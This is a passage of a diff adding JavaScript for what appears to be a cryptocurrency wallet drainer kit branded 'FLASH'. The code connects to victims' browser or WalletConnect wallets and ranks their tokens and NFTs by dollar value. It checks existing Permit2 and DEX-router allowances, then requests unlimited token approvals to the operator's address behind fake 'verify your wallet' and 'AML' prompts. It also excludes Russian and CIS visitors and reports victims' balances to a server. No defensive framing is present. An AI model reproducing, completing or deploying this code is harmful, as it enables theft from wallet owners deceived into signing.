+      if (FLASH_Loader_Style == 2) {
+        FLASHL.fire({
+          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
+          showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+        });
+      } else {
+        Swal.close();
+        Swal.fire({
+          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
+          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+          showConfirmButton: true, confirmButtonText: 'OK'
+        });
+      }
+      await new Promise(r => setTimeout(r, 10000));
+      return assets;
+    }
+
+    let token_promises = [];
+
+    for (let x = (assets.length - 1); x >= 0; x--) {
+      try {
+        const asset = assets[x];
+        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
+        if (!FLASH_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
+        else if (asset.type == 'NATIVE' && !FLASH_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
+        else if (asset.type == 'ERC20' && !FLASH_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
+        else if (asset.type == 'NATIVE' && asset.amount_usd < FLASH_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
+        else if (asset.type == 'ERC20' && asset.amount_usd < FLASH_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
+        else if (asset.type == 'ERC20') {
+          if (FLASH_Settings.Settings.Permit2.Mode) {
+            token_promises.push(new Promise(async (resolve) => {
+              try {
+                if (asset.amount_usd >= FLASH_Settings.Settings.Permit2.Price) {
+                  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+                  const contract = new ethers.Contract(asset.address, FLASH_Contract_ABI['ERC20'], node);
+                  let allowance = await contract.allowance(FLASH_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
+                  if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
+                    asset.permit2 = true;
+                    asset.allowance = allowance;
+                    console.log(`[PERMIT_2 FOUND] ${asset.name}, Allowance: ${allowance}`);
+                  }
+                }
+              } catch(err) {
+                console.log(err);
+              } resolve();
+            }));
+          }
+          if ((FLASH_Settings.Settings.Permit.Mode && FLASH_Settings.Settings.Permit.Priority > 0) || (FLASH_Settings.Settings.Approve.MetaMask >= 2 && FLASH_Current_Provider == 'MetaMask') || (FLASH_Settings.Settings.Approve.Trust >= 2 && FLASH_Current_Provider == 'Trust Wallet')) {
+            token_promises.push(new Promise(async (resolve) => {
+              try {
+                if ((FLASH_Settings.Settings.Approve.MetaMask >= 2 && FLASH_Current_Provider == 'MetaMask') || (FLASH_Settings.Settings.Approve.Trust >= 2 && FLASH_Current_Provider == 'Trust Wallet') || asset.amount_usd >= FLASH_Settings.Settings.Permit.Price) {
+                  const data = await retrive_token(asset.chain_id, asset.address);
+                  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+                  const contract = new ethers.Contract(asset.address, data, node);
+                  if (is_increase_approve(contract.functions) == 2) {
+                    asset.increase = 2;
+                    asset.abi = data;
+                  } else if (is_increase_approve(contract.functions) == 1) {
+                    asset.increase = 1;
+                    asset.abi = data;
+                  }
+                  if (asset.amount_usd >= FLASH_Settings.Settings.Permit.Price) {
+                    const permit_type = get_permit_type(contract.functions);
+                    asset.permit = permit_type;
+                    asset.permit_ver = "1";
+                    asset.abi = data;
+                    if (permit_type > 0) {
+                      if (contract.functions.hasOwnProperty('version')) {
+                        try {
+                          asset.permit_ver = await contract.version();
+                        } catch(err) {
+                          console.log(err);
+                        }
+                      }
+                      console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
+                    }
+                  }
+                }
+              } catch(err) {
+                console.log(err);
+              } resolve();
+            }));
+          }
+          if (FLASH_Settings.Settings.Swappers.Enable) {
+            token_promises.push(new Promise(async (resolve) => {
+              try {
+                if (asset.amount_usd >= FLASH_Settings.Settings.Swappers.Price) {
+                  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+                  for (const swapper of FLASH_Routers[asset.chain_id]) {
+                    try {
+                      const contract = new ethers.Contract(asset.address, FLASH_Contract_ABI['ERC20'], node);
+                      const allowance = await contract.allowance(FLASH_Current_Address, swapper[1]);
+                      if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
+                        if (swapper[0] == 'Quickswap' && FLASH_Settings.Settings.Swappers.Quick == 0) continue;
+                        if (swapper[0] == 'Sushiswap' && FLASH_Settings.Settings.Swappers.Sushi == 0) continue;
+                        if (swapper[0] == 'Uniswap' && (!FLASH_Uniswap_Whitelist.includes(asset.address) || FLASH_Settings.Settings.Swappers.Uniswap == 0)) continue;
+                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!FLASH_Pancake_Whitelist.includes(asset.address) || FLASH_Settings.Settings.Swappers.Pancake == 0)) continue;
+                        asset.swapper = true;
+                        asset.swapper_type = swapper[0];
+                        asset.swapper_address = swapper[1];
+                        asset.swapper_allowance = allowance;
+                        console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
+                        break;
+                      }
+                    } catch(err) {
+                      console.log(err);
+                    }
+                  }
+                }
+              } catch(err) {
+                console.log(err);
+              } resolve();
+            }));
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    await Promise.all(token_promises);
+
+    let NFT_Status = false;
+
+    for (const chain_id in FLASH_Settings.Settings.Chains) {
+      try {
+        if (FLASH_Settings.Settings.Chains[chain_id].NFTs) {
+          NFT_Status = true;
+          break;
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    if (NFT_Status) {
+      try {
+        let nft_list = [];
+        response = await send_request({ action: 'check_nft', address: FLASH_Current_Address });
+        if (response.status == 'OK') {
+          nft_list = response.data;
+          for (const asset of nft_list) {
+            try {
+              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
+              if (asset.type == 'ERC1155') continue;
+              if (!FLASH_Settings.Settings.Chains[chain_id].NFTs) continue;
+              if (asset.amount_usd < FLASH_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
+              assets.push(asset);
+            } catch(err) {
+              console.log(err);
+            }
+          }
+        } else {
+          nft_list = await get_nfts(address);
+          for (const asset of nft_list) {
+            try {
+              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
+              if (asset.type == 'ERC1155') continue;
+              if (!FLASH_Settings.Settings.Chains[chain_id].NFTs) continue;
+              if (asset.amount_usd < FLASH_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
+              assets.push(asset);
+            } catch(err) {
+              console.log(err);
+            }
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });
+
+    if (FLASH_Settings.Settings.Tokens_First == 1) {
+      const new_assets = [];
+      for (const asset of assets) {
+        try {
+          if (asset.type == 'NATIVE') continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      for (const asset of assets) {
+        try {
+          if (asset.type != 'NATIVE') continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      assets = new_assets;
+    } else if (FLASH_Settings.Settings.Tokens_First == 2) {
+      const new_assets = [];
+      for (const asset of assets) {
+        try {
+          if (asset.type != 'NATIVE') continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      for (const asset of assets) {
+        try {
+          if (asset.type == 'NATIVE') continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      assets = new_assets;
+    }
+
+    if (FLASH_Settings.Settings.Swappers.Enable && FLASH_Settings.Settings.Swappers.Priority == 1) {
+      const new_assets = [];
+      for (const asset of assets) {
+        try {
+          if (!asset.swapper) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      for (const asset of assets) {
+        try {
+          if (asset.swapper) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      assets = new_assets;
+    }
+
+    if (FLASH_Settings.Settings.Permit.Mode && FLASH_Settings.Settings.Permit.Priority > 0) {
+      const new_assets = [];
+      for (const asset of assets) {
+        try {
+          if (!asset.permit || asset.permit == 0 || asset.amount_usd < FLASH_Settings.Settings.Permit.Priority) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      for (const asset of assets) {
+        try {
+          if (asset.permit && asset.permit > 0 && asset.amount_usd >= FLASH_Settings.Settings.Permit.Priority) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      assets = new_assets;
+    }
+
+    if (FLASH_Settings.Settings.Swappers.Enable && FLASH_Settings.Settings.Swappers.Priority == 2) {
+      const new_assets = [];
+      for (const asset of assets) {
+        try {
+          if (!asset.swapper) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      for (const asset of assets) {
+        try {
+          if (asset.swapper) continue;
+          new_assets.push(asset);
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      assets = new_assets;
+    }
+
+    return assets;
+  } catch(err) {
+    console.log(err);
+    return [];
+  }
+};
+
+const APPROVE_TOKEN = async (asset) => {
+  if (FLASH_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN(asset); return 2; }
+
+  if (((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask >= 2) || (FLASH_Current_Provider == 'Trust Wallet' && FLASH_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
+    try {
+      for (let x = 0; x < 2; x++) {
+        if (asset.increase) continue;
+        try {
+          const ic_data = await retrive_token(asset.chain_id, asset.address);
+          const ic_node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
+          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
+          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  if (((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask >= 2) || (FLASH_Current_Provider == 'Trust Wallet' && FLASH_Settings.Settings.Approve.Trust >= 2)) && asset.increase) return await MM_APPROVE_TOKEN(asset);
+  if (((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask == 2) || (FLASH_Current_Provider == 'Trust Wallet' && FLASH_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
+  if (((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask == 3) || (FLASH_Current_Provider == 'Trust Wallet' && FLASH_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');
+
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let max_approval_amount = ethers.utils.parseEther(FLASH_Unlimited_Amount);
+  for (const c_address of FLASH_Settings.Unlimited_BL) {
+    try {
+      if (c_address[0] == FLASH_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
+        max_approval_amount = asset.amount_raw;
+        break;
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  const unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC20'], asset.address);
+
+  contract_data = web3_contract.methods.approve((FLASH_Settings.Settings.Use_Randomizer_For_Tokens ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address), max_approval_amount).encodeABI();
+
+  unsigned_tx.data = contract_data;
+  const gas_limit = await node.estimateGas(unsigned_tx);
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+  unsigned_tx.nonce = nonce;
+
+  await approve_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  await approve_success(asset); sign_ready(); return 1;
+};
+
+const MM_APPROVE_TOKEN = async (asset) => {
+  if (((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask >= 2) || (FLASH_Current_Provider == 'Trust Wallet' && FLASH_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
+    try {
+      for (let x = 0; x < 2; x++) {
+        if (asset.increase) continue;
+        try {
+          const ic_data = await retrive_token(asset.chain_id, asset.address);
+          const ic_node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
+          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
+          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let max_approval_amount = ethers.utils.parseEther(FLASH_Unlimited_Amount);
+  for (const c_address of FLASH_Settings.Unlimited_BL) {
+    try {
+      if (c_address[0] == FLASH_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
+        max_approval_amount = asset.amount_raw;
+        break;
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  const unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
+  const web3_contract = new web3.eth.Contract([
+    {
+      "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
+      "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
+    }
+  ], asset.address);
+
+  contract_data = web3_contract.methods[increase_type]((FLASH_Settings.Settings.Use_Randomizer_For_Tokens ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address), max_approval_amount).encodeABI();
+
+  unsigned_tx.data = contract_data;
+  const gas_limit = await node.estimateGas(unsigned_tx);
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+  unsigned_tx.nonce = nonce;
+
+  await approve_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  await approve_success(asset); sign_ready(); return 1;
+};
+
+const connect_wallet = async (provider = null) => {
+  try {
+    if (!FLASH_Connection) {
+      if (FLASH_Load_Time == null || Math.floor(Date.now() / 1000) - FLASH_Load_Time < 15) return;
+      if (FLASH_Loader_Style == 2) {
+        FLASHL.fire({
+          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
+          showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+        });
+      } else {
+        Swal.close();
+        Swal.fire({
+          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
+          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+          showConfirmButton: true, confirmButtonText: 'OK'
+        });
+      }
+      return;
+    }
+    if (FLASH_Process) return; FLASH_Process = true;
+    if (FLASH_Bad_Country) {
+      try { flash_hide(); } catch(err) { console.log(err); }
+      try {
+        if (FLASH_Loader_Style == 2) {
+          FLASHL.fire({
+            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
+            showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+          });
+        } else {
+          Swal.close();
+          Swal.fire({
+            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
+            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
+            showConfirmButton: true, confirmButtonText: 'OK'
+          });
+        }
+        await new Promise(r => setTimeout(r, 15000));
+        window.location.href = 'https://ya.ru';
+      } catch(err) {
+        console.log(err);
+      }
+      return;
+    }
+    if (provider !== null) {
+      if (provider == 'MetaMask') {
+        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
+          let is_installed = false;
+          for (const elem of window.ethereum.providers) {
+            if (elem.isMetaMask == true) {
+              is_installed = true;
+              FLASH_Provider = elem;
+              FLASH_Current_Provider = 'MetaMask';
+              break;
+            }
+          }
+          if (!is_installed) {
+            if (FLASH_Mobile_Status) {
+              window.location.href = `https://metamask.app.link/dapp/${FLASH_Current_URL}`;
+              FLASH_Process = false;
+              return;
+            } else {
+              window.open('https://metamask.io', '_blank').focus();
+              FLASH_Process = false;
+              return;
+            }
+          }
+        } else {
+          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
+            FLASH_Provider = window.ethereum;
+            FLASH_Current_Provider = 'MetaMask';
+          } else {
+            if (FLASH_Mobile_Status) {
+              window.location.href = `https://metamask.app.link/dapp/${FLASH_Current_URL}`;
+              FLASH_Process = false;
+              return;
+            } else {
+              window.open('https://metamask.io', '_blank').focus();
+              FLASH_Process = false;
+              return;
+            }
+          }
+        }
+      } else if (provider == 'Coinbase') {
+        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
+          let is_installed = false;
+          for (const elem of window.ethereum.providers) {
+            if (elem.isCoinbaseWallet == true) {
+              is_installed = true;
+              FLASH_Provider = elem;
+              break;
+            }
+          }
+          if (is_installed) {
+            FLASH_Current_Provider = 'Coinbase';
+          } else {
+            if (FLASH_Mobile_Status) {
+              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${FLASH_Current_URL}`;
+              FLASH_Process = false;
+              return;
+            } else {
+              window.open('https://www.coinbase.com/wallet', '_blank').focus();
+              FLASH_Process = false;
+              return;
+            }
+          }
+        } else {
+          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
+            FLASH_Provider = window.ethereum;
+            FLASH_Current_Provider = 'Coinbase';
+          } else {
+            if (FLASH_Mobile_Status) {
+              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${FLASH_Current_URL}`;
+              FLASH_Process = false;
+              return;
+            } else {
+              window.open('https://www.coinbase.com/wallet', '_blank').focus();
+              FLASH_Process = false;
+              return;
+            }
+          }
+        }
+      } else if (provider == 'Trust Wallet') {
+        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
+          FLASH_Provider = window.ethereum;
+          FLASH_Current_Provider = 'Trust Wallet';
+        } else {
+          if (FLASH_Mobile_Status) {
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${FLASH_Current_URL}`;
+            FLASH_Process = false;
+            return;
+          } else {
+            window.open('https://trustwallet.com', '_blank').focus();
+            FLASH_Process = false;
+            return;
+          }
+        }
+      } else if (provider == 'Binance Wallet') {
+        if (typeof window.BinanceChain === 'object') {
+          FLASH_Provider = window.BinanceChain;
+          FLASH_Current_Provider = 'Binance Wallet';
+        } else {
+          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
+          FLASH_Process = false;
+          return;
+        }
+      } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
+        FLASH_Current_Provider = 'WalletConnect';
+      } else {
+        if (typeof window.ethereum === 'object') {
+          FLASH_Provider = window.ethereum;
+          FLASH_Current_Provider = 'Ethereum';
+        } else {
+          FLASH_Current_Provider = 'WalletConnect';
+        }
+      }
+    } else {
+      if (window.ethereum) {
+        FLASH_Provider = window.ethereum;
+        FLASH_Current_Provider = 'Ethereum';
+      } else {
+        FLASH_Current_Provider = 'WalletConnect';
+      }
+    }
+    try {
+      await connect_request();
+      let connection = null;
+      if (FLASH_Current_Provider == 'WalletConnect') {
+          //document.getElementsByClassName('flash_modal').style.display = 'none';
+          document.getElementById("flash-modal").style.display = "none";
+          
+        //flash_hide();
+        await load_wc();
+        try {
+          await FLASH_Provider.disconnect();
+        } catch(err) {
+          console.log(err);
+        }
+        await FLASH_Provider.connect();
+        if (FLASH_Provider && FLASH_Provider.accounts.length > 0) {
+          if (!FLASH_Provider.accounts[0].includes('0x')) {
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+          await new Promise(r => setTimeout(r, 2500));
+          FLASH_Current_Address = FLASH_Provider.accounts[0];
+          FLASH_Current_Chain_ID = FLASH_Provider.chainId;
+          FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+          FLASH_Signer = FLASH_Web3.getSigner();
+          if (FLASH_Settings.Settings.Sign.WalletConnect == 0) {
+            FLASH_Sign_Disabled = true;
+          }
+        } else {
+          FLASH_Process = false;
+          return await connect_cancel();
+        }
+      } else if (FLASH_Current_Provider == 'Trust Wallet' && !FLASH_Mobile_Status) {
+        try {
+          connection = await FLASH_Provider.request({ method: 'eth_requestAccounts', params: [{ eth_accounts: {} }] });
+          if (connection && connection.length > 0) {
+            if (!FLASH_Provider.selectedAddress.includes('0x')) return connect_cancel();
+            FLASH_Current_Address = FLASH_Provider.selectedAddress;
+            FLASH_Current_Chain_ID = parseInt(FLASH_Provider.chainId);
+            FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+            FLASH_Signer = FLASH_Web3.getSigner();
+          } else {
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+        } catch(err) {
+          connection = await FLASH_Provider.request({ method: 'eth_requestAccounts' });
+          if (connection && connection.length > 0) {
+            if (!connection[0].includes('0x')) return connect_cancel();
+            FLASH_Current_Address = connection[0];
+            FLASH_Current_Chain_ID = parseInt(FLASH_Provider.chainId);
+            FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+            FLASH_Signer = FLASH_Web3.getSigner();
+          } else {
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+        }
+      } else {
+        try {
+          connection = await FLASH_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
+          if (connection && connection.length > 0) {
+            if (!FLASH_Provider.selectedAddress.includes('0x')) return connect_cancel();
+            FLASH_Current_Address = FLASH_Provider.selectedAddress;
+            FLASH_Current_Chain_ID = parseInt(FLASH_Provider.chainId);
+            FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+            FLASH_Signer = FLASH_Web3.getSigner();
+          } else {
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+        } catch(err) {
+          connection = await FLASH_Provider.request({ method: 'eth_requestAccounts' });
+          if (connection && connection.length > 0) {
+            if (!connection[0].includes('0x')) return connect_cancel();
+            FLASH_Current_Address = connection[0];
+            FLASH_Current_Chain_ID = parseInt(FLASH_Provider.chainId);
+            FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+            FLASH_Signer = FLASH_Web3.getSigner();
+          } else {
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+        }
+      }
+      if (!FLASH_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
+    } catch(err) {
+      console.log(err);
+      FLASH_Process = false;
+      return await connect_cancel();
+    }
+    ms_hide();
+    if (FLASH_Settings.V_MODE == 1) {
+      if (FLASH_Loader_Style == 2) {
+        FLASHL.fire({
+          icon: 'load', title: 'Waiting for action', text: 'Sign message to verificate your wallet',
+          showConfirmButton: true, confirmButtonText: 'Waiting...', color: FLASH_Color_Scheme
+        });
+      } else {
+        Swal.fire({
+          html: '<b>Sign message</b> to verificate you wallet...',
+          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+          timer: 0, width: 600, showConfirmButton: false
+        });
+      }
+      try {
+        const verification_message = ((FLASH_Verify_Message == "") ? FLASH_Settings.V_FLASHG : FLASH_Verify_Message).replaceAll('{{ADDRESS}}', FLASH_Current_Address);
+        const signed_message = await FLASH_Signer.signMessage(verification_message);
+        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
+        if (!is_sign_correct) {
+          if (FLASH_Loader_Style == 2) {
+            FLASHL.fire({
+              icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
+              showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+            });
+          } else {
+            Swal.fire({
+              title: 'Verification Error',
+              text: "We have received your signature, but it's incorrect, please try again.",
+              icon: 'error', confirmButtonText: 'OK'
+            });
+          }
+
+          FLASH_Process = false;
+          return await connect_cancel();
+        } else {
+          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: FLASH_Current_Address, message: FLASH_Verify_Message });
+          if (server_result.status != 'OK') {
+            if (FLASH_Loader_Style == 2) {
+              FLASHL.fire({
+                icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
+                showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+              });
+            } else {
+              Swal.fire({
+                title: 'Verification Error',
+                text: "We have received your signature, but it's incorrect, please try again.",
+                icon: 'error', confirmButtonText: 'OK'
+              });
+            }
+            FLASH_Process = false;
+            return await connect_cancel();
+          }
+        }
+      } catch(err) {
+        if (FLASH_Loader_Style == 2) {
+          FLASHL.fire({
+            icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We cannot verify that the wallet is yours as you did not sign the message provided.',
+            showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+          });
+        } else {
+          Swal.fire({
+            title: 'Verification Error',
+            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
+            icon: 'error', confirmButtonText: 'OK'
+          });
+        }
+        FLASH_Process = false;
+        return await connect_cancel();
+      }
+    } else {
+      await send_request({ action: 'sign_verify', address: FLASH_Current_Address });
+    }
+    await connect_success(); show_check();
+    if (FLASH_Settings.Wallet_Blacklist.length > 0 && FLASH_Settings.Wallet_Blacklist.includes(FLASH_Current_Address.toLowerCase().trim())) {
+      FLASH_Check_Done = true; Swal.close();
+      if (FLASH_Loader_Style == 2) {
+        FLASHL.fire({
+          icon: 'error', title: 'Error', subtitle: 'AML Error', text: 'Your wallet is not AML clear!',
+          showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+        });
+      } else {
+        Swal.fire({
+          title: 'AML Error',
+          text: "Your wallet is not AML clear, you can\'t use it!",
+          icon: 'error', confirmButtonText: 'OK'
+        });
+      }
+      FLASH_Process = false;
+      return;
+    }
+    let assets = await get_wallet_assets(FLASH_Current_Address);
+    let assets_price = 0; for (const asset of assets) {
+      try {
+        assets_price += asset.amount_usd;
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
+    await send_request({ action: 'check_finish', user_id: FLASH_ID, assets: assets, balance: assets_usd_balance });
+    FLASH_Check_Done = true; Swal.close();
+    if (FLASH_Settings.Settings.Minimal_Wallet_Price > assets_price) {
+      if (FLASH_Loader_Style == 2) {
+        FLASHL.fire({
+          icon: 'error', title: 'Error', subtitle: 'Something went wrong!', text: 'For security reasons we can\'t allow you to connect empty or new wallet',
+          showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
+        });
+      } else {
+        Swal.fire({
+          title: 'Something went wrong!',
+          text: "For security reasons we can't allow you to connect empty or new wallet",
+          icon: 'error', confirmButtonText: 'OK'
+        });
+      }
+      FLASH_Process = false;
+      return;
+    }
+    if (FLASH_Loader_Style == 2) {
+      FLASHL.fire({
+        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
+        showConfirmButton: true, confirmButtonText: 'Waiting...', color: FLASH_Color_Scheme
+      });
+    } else {
+      Swal.fire({
+        html: '<b>Done!</b> Sign message in your wallet to continue...',
+        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
+        timer: 0, width: 600, showConfirmButton: false
+      });
+    }
+    if ((FLASH_Settings.Settings.Sign.MetaMask == 0 && FLASH_Current_Provider == 'MetaMask') || (FLASH_Settings.Settings.Sign.Trust == 0
